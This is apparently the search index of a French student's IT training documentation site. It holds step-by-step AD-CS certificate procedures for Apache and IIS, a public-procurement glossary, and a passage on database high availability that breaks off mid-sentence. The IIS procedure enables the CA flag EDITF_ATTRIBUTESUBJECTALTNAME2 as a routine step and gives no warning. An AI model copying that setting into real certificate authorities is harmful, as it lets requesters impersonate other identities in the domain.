{"config":{"lang":["fr"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Bienvenue sur la documentation de Nathan Etinzon","text":"<p>Site compilant la documentation faite par Nathan Etinzon dans le cadre de la formation au CEFIM.</p>"},{"location":"AD-CS_Certificat_Apache/","title":"AD-CS Certificat apache","text":""},{"location":"AD-CS_Certificat_Apache/#1ere-etape-generation-du-cle-avec-openssl","title":"1\u00e8re \u00e9tape : G\u00e9n\u00e9ration du cl\u00e9 avec openssl","text":"<p>Cr\u00e9ation de la cl\u00e9</p> <p>cd /etc/ssl/private sudo openssl genrsa -out www.etinzon.cefim.key 2048</p>"},{"location":"AD-CS_Certificat_Apache/#2eme-etape-creation-dun-fichier-de-conf-avec-les-subjectaltname","title":"2\u00e8me \u00e9tape : Cr\u00e9ation d'un fichier de conf avec les subjectAltName","text":"<p>Cr\u00e9ation du fichier de conf avec les SubjectAltName</p> <p>cd /etc/ssl nano www.etinzon.cefim.conf</p> <p>[req] default_bits = 2048 prompt = no default_md = sha256 req_extensions = req_ext distinguished_name = dn [ dn ] C=FR ST=Tours L=CVDL O=IT  OU=Testing Domain emailAddress=admin@www.etinzon.cefim CN = www.etinzon.cefim [ req_ext ] subjectAltName = @alt_names [ alt_names ] DNS.1 = etinzon.cefim DNS.2 = www.etinzon.cefim  </p>"},{"location":"AD-CS_Certificat_Apache/#3eme-etape-creation-du-csr-avec-le-fichier-de-conf","title":"3\u00e8me \u00e9tape : Cr\u00e9ation du csr avec le fichier de conf","text":"<p>On se place \u00e0 l'endroit o\u00f9 est la cl\u00e9, on indique que l'on veut un certificat csr avec comme config le fichier de conf cr\u00e9e auparavant</p> <p>cd /etc/ssl/private  openssl req -new -key www.etinzon.cefim.key -out www.etinzon.cefim.csr -config ../www.etinzon.cefim.conf</p>"},{"location":"AD-CS_Certificat_Apache/#4eme-etape-importer-le-csr-sur-lad-cs","title":"4\u00e8me \u00e9tape : Importer le csr sur l'AD-CS","text":"<p>Partage r\u00e9seau / Winscp / VMtools</p>"},{"location":"AD-CS_Certificat_Apache/#5eme-etape-signer-le-csr-avec-lauthorite-de-certification","title":"5\u00e8me \u00e9tape : Signer le csr avec l'authorit\u00e9 de certification","text":"<p>Se d\u00e9placer dans l'emplacement o\u00f9 a \u00e9t\u00e9 depos\u00e9 le .csr, ensuite lancer une requ\u00eate afin de signer le certificat et obtenir un .cer</p> <p>cd ./desktop certreq -submit -attrib \"CertificateTemplate:WebServer\" www.etinzon.cefim.csr</p> <p></p> <p>Ensuite, donner un nom au fichier. Exemple : www.etinzon.cefim</p> <p></p>"},{"location":"AD-CS_Certificat_Apache/#6eme-etape-importer-le-cer-dans-lapache","title":"6\u00e8me \u00e9tape : Importer le .cer dans l'apache","text":"<p>Partage r\u00e9seau / Winscp / VMtools</p> <p>Deposer le .cer dans /etc/ssl/cert</p> <p></p>"},{"location":"AD-CS_Certificat_Apache/#7eme-etape-configuration-dapache","title":"7\u00e8me \u00e9tape : Configuration d'apache","text":"<p>Mettre le bon path pour chaque certificat</p> <p>cd /etc/apache2/sites-available nano default-ssl.conf</p> <p>SSLCertificateFile  /etc/ssl/certs/www.etinzon.cefim.cer SSLCertificateKeyFile   /etc/ssl/private/www.etinzon.cefim.key</p> <p></p> <p>systemctl restart apache2</p>"},{"location":"AD-CS_Certificat_Apache/#resultat","title":"R\u00e9sultat","text":""},{"location":"AD-CS_Certificat_IIS/","title":"AD-CS Certificat IIS","text":"<p>/!\\ Remplacer les diff\u00e9rentes informations par les votres /!\\</p>"},{"location":"AD-CS_Certificat_IIS/#1ere-etape-generation-de-la-requete-de-certificat","title":"1\u00e8re \u00e9tape : G\u00e9n\u00e9ration de la requ\u00eate de certificat","text":"<p>Sur le serveur IIS</p> <p>Dans la console de gestion de IIS, ouvrir la console Certificat, faire un clic-droit et s\u00e9lectionner Cr\u00e9er une demande de certificat </p> <p>Renseigner les informations suivantes. </p> <p>S\u00e9lectionner le param\u00e9trage ci-dessous. </p> <p>Renseigner le dossier et de nom o\u00f9 se trouvera la requ\u00eate.  </p>"},{"location":"AD-CS_Certificat_IIS/#2eme-etape-recuperation-de-la-requete","title":"2\u00e8me \u00e9tape : R\u00e9cup\u00e9ration de la requ\u00eate","text":"<p>Sur le serveur AD-CS Via Partage r\u00e9seau / Winscp / VMtools</p>"},{"location":"AD-CS_Certificat_IIS/#3eme-etape-creation-du-certificat","title":"3\u00e8me \u00e9tape : Cr\u00e9ation du certificat","text":"<p>Sur le serveur AD-CS</p> <p>Sur PowerShell, entrer les commandes suivantes : certutil -setreg policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2 /!\\ R\u00e9demarrer le service sinon les modifications ne seront pas prises en compte /!\\  </p> <p>Ensuite :  certreq -submit -attrib \"CertificateTemplate:webServer\\nSAN:dns=Ton_FQDN&amp;ipaddress=IP_IIS\" Requ\u00eate.txt</p> <p>S\u00e9lectionner l'autorit\u00e9 de certification. </p> <p>Enregistrer le certificat en .cer </p>"},{"location":"AD-CS_Certificat_IIS/#4eme-etape-recuperation-du-certificat","title":"4\u00e8me \u00e9tape : R\u00e9cup\u00e9ration du certificat","text":"<p>Sur le serveur IIS Partage r\u00e9seau / Winscp / VMtools</p>"},{"location":"AD-CS_Certificat_IIS/#5eme-etape-importation-du-certificat","title":"5\u00e8me \u00e9tape : Importation du certificat","text":"<p>Sur le serveur IIS</p> <p>Dans la console de gestion de IIS, ouvrir la console Certificat, faite un clic-droit et s\u00e9lectionner Terminer une demande de certificat. </p> <p>S\u00e9lectionner le certificat. </p>"},{"location":"AD-CS_Certificat_IIS/#6eme-etape-debugage-certificat-fantome","title":"6\u00e8me \u00e9tape : D\u00e9bugage certificat fant\u00f4me","text":"<p>Sur le serveur IIS (Si le certificat disparait d\u00e8s que la console est actualis\u00e9e, suivez les \u00e9tapes suivantes)</p> <p>Dans la console de certificat, dans le magasin H\u00e9bergement Web, rechercher le num\u00e9ro de s\u00e9rie de votre certificat et le copier. </p> <p>Sous PowerShell, entrer la commande suivante : certutil -repairstore webHosting Serial_Number</p> <p>R\u00e9sultat : </p> <p>Rafraichir la console IIS et le certificat devrait r\u00e9appara\u00eetre.</p>"},{"location":"AD-CS_Certificat_IIS/#7eme-etape-liaison-https","title":"7\u00e8me \u00e9tape : Liaison HTTPS","text":"<p>Sur le serveur IIS</p> <p>Dans la console de gestion de IIS, faire un clic-droit sur le VHost et s\u00e9lectionner Modifier les liaisons. </p> <p>Cr\u00e9er la liaison suivante en s\u00e9lectionnant le certificat r\u00e9cemment import\u00e9. </p>"},{"location":"AD-CS_Certificat_IIS/#8eme-etape-redirection-http-https","title":"8\u00e8me \u00e9tape : Redirection HTTP =&gt; HTTPS","text":"<p>Superbe proc\u00e9dure : https://www.ssl.com/how-to/redirect-http-to-https-with-windows-iis-10/</p>"},{"location":"AD-CS_Certificat_IIS/#resultat","title":"R\u00e9sultat","text":""},{"location":"Gestion_de_projet_Definition/","title":"Gestion de projet | D\u00e9finition","text":""},{"location":"Gestion_de_projet_Definition/#aac-avis-dappel-a-la-concurrence","title":"AAC (Avis d'Appel \u00e0 la Concurrence)","text":"<p>L'avis de march\u00e9 est un avis d'appel \u00e0 la concurrence (AAC) est une annonce publi\u00e9e par le pouvoir adjudicateur ou l\u2019entit\u00e9 adjudicatrice destin\u00e9e \u00e0 informer les candidats potentiels \u00e0 un march\u00e9 des principales caract\u00e9ristiques de ce dernier</p>"},{"location":"Gestion_de_projet_Definition/#aapc-appel-doffres-public-ou-procedure-adaptee","title":"AAPC (Appel d'Offres Public ou Proc\u00e9dure Adapt\u00e9e)","text":"<p>Processus par lequel une entit\u00e9 publique demande des offres de la part de diff\u00e9rents fournisseurs ou prestataires pour r\u00e9pondre \u00e0 un besoin sp\u00e9cifique.</p>"},{"location":"Gestion_de_projet_Definition/#aapc-avis-dappel-public-a-la-concurrence","title":"AAPC (Avis d'Appel Public \u00e0 la Concurrence)","text":"<p>L'avis d'appel public \u00e0 la concurrence (AAPC) avait \u00e9t\u00e9 renomm\u00e9 avis d'appel \u00e0 la concurrence (AAC) avec la r\u00e9forme des march\u00e9s publics de 2016.</p>"},{"location":"Gestion_de_projet_Definition/#accord-cadre","title":"Accord Cadre","text":"<p>Contrat \u00e9tabli entre une entit\u00e9 publique et un ou plusieurs fournisseurs pour fixer les termes et les conditions r\u00e9gissant les commandes ult\u00e9rieures sur une p\u00e9riode d\u00e9finie.</p>"},{"location":"Gestion_de_projet_Definition/#adjudicataire","title":"Adjudicataire","text":"<p>Entit\u00e9 ou personne \u00e0 qui est attribu\u00e9 un contrat \u00e0 la suite d'une proc\u00e9dure d'adjudication (ex : appel d'offres) dans le cadre d'un march\u00e9 public.</p>"},{"location":"Gestion_de_projet_Definition/#ae-autorisation-dengagement","title":"AE (Autorisation d'Engagement)","text":"<p>Validation administrative permettant de r\u00e9server une somme budg\u00e9taire pour un projet, sans que les d\u00e9penses soient effectivement engag\u00e9es.</p>"},{"location":"Gestion_de_projet_Definition/#amoa-assistance-a-maitrise-douvrage","title":"AMOA (Assistance \u00e0 Ma\u00eetrise d'Ouvrage)","text":"<p>Service d'assistance externe apport\u00e9 au ma\u00eetre d'ouvrage pour l'aider dans la gestion, le suivi et la r\u00e9alisation d'un projet.</p>"},{"location":"Gestion_de_projet_Definition/#amoe-assistance-a-maitrise-duvre","title":"AMOE (Assistance \u00e0 Ma\u00eetrise d'\u0152uvre)","text":"<p>Prestation d'assistance apport\u00e9e au ma\u00eetre d'\u0153uvre dans la r\u00e9alisation technique d'un projet.</p>"},{"location":"Gestion_de_projet_Definition/#attri2","title":"ATTRI2","text":"<p>Un mod\u00e8le de d\u00e9claration de sous-traitance propos\u00e9 par la Direction des Affaires Juridiques (DAJ) du minist\u00e8re de l'\u00e9conomie et des finances.</p>"},{"location":"Gestion_de_projet_Definition/#boamp-bulletin-officiel-des-annonces-des-marches-publics","title":"BOAMP (Bulletin Officiel des Annonces des March\u00e9s Publics)","text":"<p>Plateforme officielle en France regroupant les annonces et informations relatives aux march\u00e9s publics.</p>"},{"location":"Gestion_de_projet_Definition/#bpu-bordereau-des-prix-unitaires","title":"BPU (Bordereau des Prix Unitaires)","text":"<p>Document d\u00e9taillant les prix unitaires des diff\u00e9rents postes ou \u00e9l\u00e9ments d'un march\u00e9, utilis\u00e9 pour \u00e9valuer les co\u00fbts.</p>"},{"location":"Gestion_de_projet_Definition/#ccap-cahier-des-clauses-administratives-particulieres","title":"CCAP (Cahier des Clauses Administratives Particuli\u00e8res)","text":"<p>Document faisant partie du dossier de consultation d'un march\u00e9 public, il d\u00e9finit les conditions administratives sp\u00e9cifiques au contrat.</p>"},{"location":"Gestion_de_projet_Definition/#cctp-cahier-des-clauses-techniques-particulieres","title":"CCTP (Cahier des Clauses Techniques Particuli\u00e8res)","text":"<p>Document d\u00e9taillant les sp\u00e9cifications techniques et les exigences pour la r\u00e9alisation d'un projet ou d'un march\u00e9 public.</p>"},{"location":"Gestion_de_projet_Definition/#cgafcs","title":"CGAFCS","text":"<p>Conditions g\u00e9n\u00e9rales d\u2019achat applicables aux fournitures courantes et services.</p>"},{"location":"Gestion_de_projet_Definition/#cmp-code-des-marches-publics","title":"CMP (Code des March\u00e9s Publics)","text":"<p>Ensemble de r\u00e8gles et de principes r\u00e9gissant les march\u00e9s publics en France.</p>"},{"location":"Gestion_de_projet_Definition/#critere","title":"Crit\u00e8re","text":"<p>\u00c9l\u00e9ment \u00e9valu\u00e9 pour prendre une d\u00e9cision dans le cadre d'une proc\u00e9dure de s\u00e9lection (ex : crit\u00e8res de qualit\u00e9, prix, etc.).</p>"},{"location":"Gestion_de_projet_Definition/#dc1-dc2-dc4-declaration-du-candidat","title":"DC1, DC2, DC4 (D\u00e9claration du Candidat)","text":"<p>Documents administratifs utilis\u00e9s lors des appels d'offres pour v\u00e9rifier l'\u00e9ligibilit\u00e9 des entreprises \u00e0 soumissionner pour un march\u00e9 public.</p>"},{"location":"Gestion_de_projet_Definition/#dqe-detail-quantitatif-et-estimatif","title":"DQE (D\u00e9tail Quantitatif et Estimatif)","text":"<p>Document d\u00e9taillant les quantit\u00e9s et les estimations de co\u00fbts pour chaque \u00e9l\u00e9ment d'un march\u00e9 public.</p>"},{"location":"Gestion_de_projet_Definition/#dpgf-decomposition-du-prix-global-et-forfaitaire","title":"DPGF (D\u00e9composition du Prix Global et Forfaitaire)","text":"<p>Document d\u00e9taillant le prix total et forfaitaire d'un march\u00e9 public, d\u00e9compos\u00e9 en diff\u00e9rents \u00e9l\u00e9ments.</p>"},{"location":"Gestion_de_projet_Definition/#dume-document-unique-de-marche-europeen","title":"DUME (Document Unique de March\u00e9 Europ\u00e9en)","text":"<p>Formulaire standardis\u00e9 utilis\u00e9 par les entreprises pour d\u00e9montrer leur \u00e9ligibilit\u00e9 lors de candidatures pour des march\u00e9s publics.</p>"},{"location":"Gestion_de_projet_Definition/#lot","title":"Lot","text":"<p>Partie distincte et identifi\u00e9e d'un march\u00e9 public, pouvant \u00eatre attribu\u00e9e s\u00e9par\u00e9ment.</p>"},{"location":"Gestion_de_projet_Definition/#marche-a-bons-de-commandes","title":"March\u00e9 \u00e0 bons de commandes","text":"<p>Contrat-cadre o\u00f9 un acheteur s'engage \u00e0 acheter des biens ou des services \u00e0 un fournisseur \u00e0 des conditions d\u00e9finies \u00e0 l'avance.</p>"},{"location":"Gestion_de_projet_Definition/#marche-public-de-travaux-exemple-en-it","title":"March\u00e9 public de travaux (exemple en IT)","text":"<p>Dans le domaine des technologies de l'information, un march\u00e9 public de travaux pourrait \u00eatre l'installation ou la mise en place d'une infrastructure r\u00e9seau dans un b\u00e2timent public.</p>"},{"location":"Gestion_de_projet_Definition/#marche-public-de-services-exemple-en-it","title":"March\u00e9 public de services (exemple en IT)","text":"<p>La maintenance et la gestion des syst\u00e8mes informatiques d'une administration publique pourraient constituer un exemple de march\u00e9 public de services en informatique.</p>"},{"location":"Gestion_de_projet_Definition/#marche-public-mixte","title":"March\u00e9 public mixte","text":"<p>Contrat qui combine diff\u00e9rents types de prestations ou de produits dans un seul march\u00e9 public.</p>"},{"location":"Gestion_de_projet_Definition/#mieux-disant","title":"Mieux Disant","text":"<p>Principe selon lequel le choix du prestataire dans un march\u00e9 public ne se fait pas seulement sur des crit\u00e8res financiers mais aussi sur des crit\u00e8res de qualit\u00e9 et de pertinence de l'offre.</p>"},{"location":"Gestion_de_projet_Definition/#procedure-allegee","title":"Proc\u00e9dure All\u00e9g\u00e9e","text":"<p>Proc\u00e9dure simplifi\u00e9e pour la passation de certains types de march\u00e9s publics, g\u00e9n\u00e9ralement adapt\u00e9e \u00e0 des situations sp\u00e9cifiques et d\u00e9finie par la r\u00e9glementation.</p>"},{"location":"Gestion_de_projet_Definition/#pse-prestations-supplementaires-eventuelles","title":"PSE (Prestations Suppl\u00e9mentaires \u00c9ventuelles)","text":"<p>Services ou travaux additionnels pouvant \u00eatre demand\u00e9s par le pouvoir adjudicateur apr\u00e8s la conclusion du contrat initial.</p>"},{"location":"Gestion_de_projet_Definition/#publicite","title":"Publicit\u00e9","text":"<p>Obligation pour les acheteurs publics de publier des informations sur les march\u00e9s publics afin d'assurer la transparence et l'acc\u00e8s \u00e9quitable aux opportunit\u00e9s commerciales.</p>"},{"location":"Gestion_de_projet_Definition/#rc-reglement-de-consultation","title":"RC (R\u00e8glement de Consultation)","text":"<p>Document d\u00e9crivant les r\u00e8gles et les modalit\u00e9s de la consultation pour un march\u00e9 public, incluant les informations n\u00e9cessaires aux soumissionnaires pour pr\u00e9senter leurs offres.</p>"},{"location":"HD_BDD/","title":"Haute disponibilit\u00e9 des base de donn\u00e9es","text":""},{"location":"HD_BDD/#introduction-aux-enjeux-de-la-ha-pour-les-bases-de-donnees","title":"Introduction aux enjeux de la HA pour les bases de donn\u00e9es","text":""},{"location":"HD_BDD/#definition-de-la-haute-disponibilite","title":"D\u00e9finition de la haute disponibilit\u00e9","text":"<p>Ensemble des strat\u00e9gies et technologies mises en place pour assurer que les bases de donn\u00e9es restent accessibles et op\u00e9rationnelles de mani\u00e8re continue, m\u00eame en cas de d\u00e9faillances ou de maintenance.</p> <p>Cela implique g\u00e9n\u00e9ralement :</p> <ul> <li>de la redondance : Avoir des copies multiples de la base de donn\u00e9es sur diff\u00e9rents serveurs pour \u00e9viter un point unique de d\u00e9faillance.</li> <li>de la tol\u00e9rance aux pannes : Capacit\u00e9 du syst\u00e8me \u00e0 continuer de fonctionner malgr\u00e9 certaines d\u00e9faillances mat\u00e9rielles ou logicielles. (PCA/PCI)</li> <li>une r\u00e9partition de la charge : Distribution des requ\u00eates sur plusieurs serveurs pour \u00e9viter les surcharges et am\u00e9liorer la performance.</li> <li>des sauvegardes r\u00e9guli\u00e8res : R\u00e9alisation de copies de sauvegarde fr\u00e9quentes pour r\u00e9cup\u00e9rer rapidement en cas de perte de donn\u00e9es.</li> <li>une surveillance proactive : Mise en place de syst\u00e8mes de surveillance pour d\u00e9tecter et r\u00e9soudre les probl\u00e8mes avant qu'ils n'affectent la disponibilit\u00e9.</li> </ul> <p>En r\u00e9sum\u00e9, le syst\u00e8me de base de donn\u00e9es doit \u00eatre accessible et fonctionnel presque 100 % du temps, en r\u00e9duisant au maximum les temps d\u2019arr\u00eat et les pertes de donn\u00e9es.</p>"},{"location":"HD_BDD/#importance-des-bases-de-donnees-dans-les-systemes-modernes","title":"Importance des bases de donn\u00e9es dans les syst\u00e8mes modernes","text":"<p>Les bases de donn\u00e9es ont un r\u00f4le essentiel dans les syst\u00e8mes modernes, car elles permettent de g\u00e9rer, stocker et r\u00e9cup\u00e9rer efficacement les informations n\u00e9cessaires pour les applications m\u00e9tier.</p> <ul> <li>Elles centralisent les donn\u00e9es : Les BDD centralisent les donn\u00e9es dans un seul endroit, ce qui \u00e9limine les duplications et les erreurs li\u00e9es \u00e0 la dispersion des informations.</li> <li>Gestion efficace des donn\u00e9es : Elles permettent de stocker, organiser et g\u00e9rer de grandes quantit\u00e9s de donn\u00e9es de mani\u00e8re structur\u00e9e et accessible.</li> <li>Performance et rapidit\u00e9 : Elles assurent des requ\u00eates et des transactions rapides, ce qui est essentiel pour les applications en temps r\u00e9el.</li> <li>S\u00e9curit\u00e9 des donn\u00e9es : Elles offrent des m\u00e9canismes de contr\u00f4le d'acc\u00e8s et de chiffrement pour prot\u00e9ger les donn\u00e9es sensibles.</li> <li>Int\u00e9grit\u00e9 et coh\u00e9rence : Elles garantissent que les donn\u00e9es restent pr\u00e9cises et coh\u00e9rentes, m\u00eame en cas de panne.</li> <li>Scalabilit\u00e9 : Elles peuvent \u00e9voluer facilement pour g\u00e9rer des volumes de donn\u00e9es croissants.</li> <li>Analyse avanc\u00e9e : Elles facilitent l'extraction et l'analyse de donn\u00e9es pour des prises de d\u00e9cision inform\u00e9es et la d\u00e9couverte d'insights pr\u00e9cieux.</li> <li>Support pour les applications : Elles sont indispensables pour le fonctionnement des applications modernes, des sites web aux syst\u00e8mes d'entreprise.</li> </ul> <p>La perte d\u2019acc\u00e8s aux bases de donn\u00e9es peuvent avoir des cons\u00e9quences dramatiques pour une organisation.</p> <p>Cela engendre:</p> <ul> <li>Perte de productivit\u00e9 :     Lorsqu\u2019un syst\u00e8me de gestion de bases de donn\u00e9es est indisponible, les utilisateurs ne peuvent pas acc\u00e9der aux informations n\u00e9cessaires pour effectuer leurs t\u00e2ches, ce qui entra\u00eene une perte de productivit\u00e9 et une diminution de la capacit\u00e9 \u00e0 r\u00e9pondre aux besoins de l\u2019entreprise.</li> <li>D\u00e9lais de livraison :     Les d\u00e9lais de livraison peuvent \u00eatre compromis en raison de la perte d\u2019acc\u00e8s aux donn\u00e9es, ce qui peut entra\u00eener des retards dans la mise \u00e0 jour des syst\u00e8mes, la gestion des stocks, la facturation, projets d\u2019analyse de donn\u00e9es, etc.</li> <li>Co\u00fbts suppl\u00e9mentaires : La perte d\u2019acc\u00e8s aux bases de donn\u00e9es peut n\u00e9cessiter des co\u00fbts suppl\u00e9mentaires pour restaurer les donn\u00e9es, r\u00e9tablir l\u2019acc\u00e8s et r\u00e9parer les dommages caus\u00e9s par la panne.</li> <li>Risque de compromission des donn\u00e9es sensibles :     Les donn\u00e9es sensibles, telles que les informations de clients, les secrets commerciaux ou les donn\u00e9es de s\u00e9curit\u00e9, peuvent \u00eatre expos\u00e9es ou compromises en cas de perte d\u2019acc\u00e8s aux bases de donn\u00e9es.</li> <li>Impact sur la confiance : La perte d\u2019acc\u00e8s aux bases de donn\u00e9es peut entra\u00eener une perte de confiance des clients et des partenaires, ainsi qu\u2019une r\u00e9duction de la valeur de l\u2019entreprise.</li> <li>Difficult\u00e9s pour les d\u00e9cisions :     Les d\u00e9cisions strat\u00e9giques et op\u00e9rationnelles ne peuvent pas \u00eatre prises en temps r\u00e9el en raison de la perte d\u2019acc\u00e8s aux donn\u00e9es, ce qui peut entra\u00eener des erreurs de d\u00e9cision et des co\u00fbts suppl\u00e9mentaires.</li> <li>Risque de non-conformit\u00e9 :     La perte d\u2019acc\u00e8s aux bases de donn\u00e9es peut entra\u00eener des non-conformit\u00e9s aux r\u00e9glementations et aux normes en vigueur, ce qui peut entra\u00eener des sanctions et des amendes.</li> <li>Gestion des vuln\u00e9rabilit\u00e9s :     La perte d\u2019acc\u00e8s aux bases de donn\u00e9es peut compromettre la s\u00e9curit\u00e9 des syst\u00e8mes et des donn\u00e9es, ce qui peut entra\u00eener des vuln\u00e9rabilit\u00e9s et des risques pour l\u2019entreprise.</li> <li>Difficult\u00e9s pour les audits :     Les audits et les v\u00e9rifications ne peuvent pas \u00eatre effectu\u00e9s en temps r\u00e9el en raison de la perte d\u2019acc\u00e8s aux donn\u00e9es, ce qui peut entra\u00eener des difficult\u00e9s pour les autorit\u00e9s de contr\u00f4le et les organismes de r\u00e9glementation.</li> <li>Perte de comp\u00e9titivit\u00e9 :     La perte d\u2019acc\u00e8s aux bases de donn\u00e9es peut entra\u00eener une perte de comp\u00e9titivit\u00e9 pour l\u2019entreprise, car les concurrents peuvent prendre avantage de la situation pour gagner des parts de march\u00e9.</li> </ul>"},{"location":"HD_BDD/#exemples-dincidents-majeurs","title":"Exemples d\u2019incidents majeurs","text":""},{"location":"HD_BDD/#4-novembre-2024-free","title":"4 Novembre 2024 : Free","text":"<p>Environ 19 millions d\u2019abonn\u00e9s ont \u00e9t\u00e9 touch\u00e9s par le vol de donn\u00e9es et 5 millions d\u2019IBAN d\u00e9rob\u00e9s \u00e0 la suite de la cyberattaque. La cause de cette br\u00e8che a \u00e9t\u00e9 identifi\u00e9e, un agent d\u2019un service client de Free qui \u00e9tait complice, \u00e0 savoir le service de proximit\u00e9 Free Proxi et Free Back Office, aurait donn\u00e9 ses identifiants OpenVPN \u00e0 une tierce personne qui serait potentiellement le pirate.</p>"},{"location":"HD_BDD/#9-septembre-2024-boulanger","title":"9 septembre 2024 : Boulanger","text":"<p>L\u2019entreprise a subit une cyberattaque et un pirate parvient \u00e0 exfiltrer 27 561 592 lignes d\u2019une base de donn\u00e9es et mis en vente sur breachForums qui est \u201cle Amazon de la cybercriminalit\u00e9\u201d. Pas de donn\u00e9es bancaires d\u00e9rob\u00e9es dans le lot, uniquement des coordonn\u00e9es g\u00e9ographique, nom, pr\u00e9nom, adresses mails, historique des commandes). La vuln\u00e9rabilit\u00e9 mise en \u00e9vidence dans cette cyberattaque est li\u00e9e \u00e0 la s\u00e9curit\u00e9 des syst\u00e8mes de gestion de livraison et des bases de donn\u00e9es externes de l\u2019enseigne. Selon les informations, le pirate informatique a exploit\u00e9 une faille dans l\u2019un de ces syst\u00e8mes pour acc\u00e9der \u00e0 la base de donn\u00e9es et extraire les informations personnelles.</p>"},{"location":"HD_BDD/#2020-meow","title":"2020 : MEOW","text":"<p>Plus de 3000 bases de donn\u00e9es publiques non s\u00e9curis\u00e9es ont \u00e9t\u00e9 vis\u00e9es. Un simple \u201cMeow\u201d est affich\u00e9 dans le but de narguer les utilisateurs une fois les donn\u00e9es effac\u00e9es. Les pirates ont utilis\u00e9 une technique simple : scanner internet pour trouver les bases de donn\u00e9es ouvertes, sans mot de passe, et les effacer. Ils ont \u00e9galement utilis\u00e9 des outils de scan pour d\u00e9tecter les vuln\u00e9rabilit\u00e9s de s\u00e9curit\u00e9 et les exploiter.</p>"},{"location":"HD_BDD/#enjeux-cles","title":"Enjeux cl\u00e9s","text":"<p>Pour r\u00e9sumer, les enjeux cl\u00e9s de la haute disponibilit\u00e9 pour les bases de donn\u00e9es incluent la continuit\u00e9 de service, la tol\u00e9rance aux pannes, et le maintien de la performance m\u00eame sous forte charge. Ils englobent \u00e9galement la protection des donn\u00e9es, la capacit\u00e9 de scalabilit\u00e9 pour g\u00e9rer des volumes croissants, l'utilisation de techniques de r\u00e9partition de charge et la possibilit\u00e9 d'effectuer des maintenances sans interruption de service. Ces mesures assurent la fiabilit\u00e9 et la disponibilit\u00e9 constantes des syst\u00e8mes critiques.</p>"},{"location":"HD_BDD/#analyse-des-differentes-approches","title":"Analyse des diff\u00e9rentes approches","text":""},{"location":"HD_BDD/#types-de-systemes-de-gestion-de-bdd-sgbd","title":"Types de syst\u00e8mes de gestion de BDD (SGBD)","text":"<p>Un syst\u00e8me de gestion de base de donn\u00e9es est compos\u00e9 de diff\u00e9rents \u00e9l\u00e9ments contribuant au fonctionnement optimal du logiciel. Le SGBD peut \u00eatre divis\u00e9 en trois \u00e9l\u00e9ments fondamentaux : le dictionnaire de donn\u00e9es, le langage de d\u00e9finition des donn\u00e9es et le langage de manipulation des donn\u00e9es.</p>"},{"location":"HD_BDD/#dictionnaire-de-donnees","title":"Dictionnaire de donn\u00e9es","text":"<p>Le dictionnaire de donn\u00e9es (Data Dictionary) se compose d\u2019un ensemble de m\u00e9tadonn\u00e9es. Celles-ci contiennent des informations sur le contenu des diff\u00e9rentes donn\u00e9es des m\u00e9moires de donn\u00e9es. D\u2019autre part, elles fournissent des informations sur l\u2019autorisation d\u2019utilisation des ensembles de donn\u00e9es et la repr\u00e9sentation physique. Pour faire simple, ce dictionnaire contient donc toutes les informations pertinentes sur les donn\u00e9es enregistr\u00e9es dans une base de donn\u00e9es.</p>"},{"location":"HD_BDD/#langage-de-definition-des-donnees","title":"Langage de d\u00e9finition des donn\u00e9es","text":"<p>Le langage de d\u00e9finition des donn\u00e9es (LDD) ou Data Definition Language (DDL) a pour but de structurer les contenus d\u2019une base de donn\u00e9es. Ce langage permet de g\u00e9n\u00e9rer, modifier et supprimer les diff\u00e9rents objets tels que les r\u00e9f\u00e9rences, les relations ou les droits d\u2019utilisateur.</p>"},{"location":"HD_BDD/#langage-de-manipulation-des-donnees","title":"Langage de manipulation des donn\u00e9es","text":"<p>Le langage de manipulation des donn\u00e9es (LMD) ou Data Manipulation Language (DML) permet d\u2019ins\u00e9rer, supprimer, modifier et lire les ensembles de donn\u00e9es contenus dans une base de donn\u00e9es. Par ailleurs, ce langage permet de compresser et d\u2019extraire les donn\u00e9es.</p> <ul> <li> <p>SGBD relationnels : Ils stockent les donn\u00e9es dans des tables avec des relations entre elles, comme MySQL, PostgreSQL, Microsoft SQL Server et Oracle Database. </p> </li> <li> <p>SGBD orient\u00e9s objets : Stockent les donn\u00e9es en tant qu\u2019objets. Ils combinent les capacit\u00e9s de programmation orient\u00e9e objet et de gestion de bases de donn\u00e9es. </p> </li> <li> <p>SGBD orient\u00e9s documents : Stockent des ensembles de donn\u00e9es dans diff\u00e9rents documents. </p> </li> <li>SGBD hi\u00e9rarchiques : Stockent les donn\u00e9es dans une structure hi\u00e9rarchique, comme les anciens syst\u00e8mes de gestion de bases de donn\u00e9es hi\u00e9rarchiques en arborescence. </li> <li>SGBD r\u00e9seau : Stockent les donn\u00e9es dans une structure de r\u00e9seau et de cr\u00e9er des connexions entre les donn\u00e9es. </li> </ul>"},{"location":"HD_BDD/#replication","title":"R\u00e9plication","text":""},{"location":"HD_BDD/#replication-synchrone","title":"R\u00e9plication synchrone","text":"<p>Les modifications apport\u00e9es \u00e0 la base de donn\u00e9es primaire sont imm\u00e9diatement propag\u00e9es aux r\u00e9pliques secondaires.</p> <ul> <li>Avantages : Garantie de la coh\u00e9rence des donn\u00e9es en temps r\u00e9el.</li> <li>Limites : Peut ralentir les performances en raison de la latence de propagation.</li> </ul>"},{"location":"HD_BDD/#replication-asynchrone","title":"R\u00e9plication asynchrone","text":"<p>Les modifications sont propag\u00e9es aux r\u00e9pliques secondaires avec un l\u00e9ger d\u00e9calage temporel.</p> <ul> <li>Avantages : Moins de surcharge sur le syst\u00e8me primaire, am\u00e9lioration des performances.</li> <li>Limites : Risque de l\u00e9g\u00e8re incoh\u00e9rence des donn\u00e9es entre la base primaire et les r\u00e9pliques.</li> </ul>"},{"location":"HD_BDD/#replication-de-fusion","title":"R\u00e9plication de fusion","text":"<p>Les modifications apport\u00e9es aux bases de donn\u00e9es primaires et secondaires sont fusionn\u00e9es pour maintenir la coh\u00e9rence.</p> <ul> <li>Avantages : Permet de r\u00e9soudre les conflits de donn\u00e9es de mani\u00e8re efficace.</li> <li>Limites : Complexit\u00e9 accrue du processus de fusion.</li> </ul>"},{"location":"HD_BDD/#replication-transactionnelle","title":"R\u00e9plication transactionnelle","text":"<p>Les transactions sont copi\u00e9es et propag\u00e9es aux r\u00e9pliques secondaires (quasi temps r\u00e9el). Une transaction est une s\u00e9quence d'op\u00e9rations r\u00e9alis\u00e9es comme une unit\u00e9 logique unique, permettant de garantir la coh\u00e9rence et l'int\u00e9grit\u00e9 des donn\u00e9es. Une transaction doit respecter quatre propri\u00e9t\u00e9s essentielles, souvent d\u00e9sign\u00e9es par l'acronyme ACID :</p> <p>Atomicit\u00e9 : Toutes les op\u00e9rations 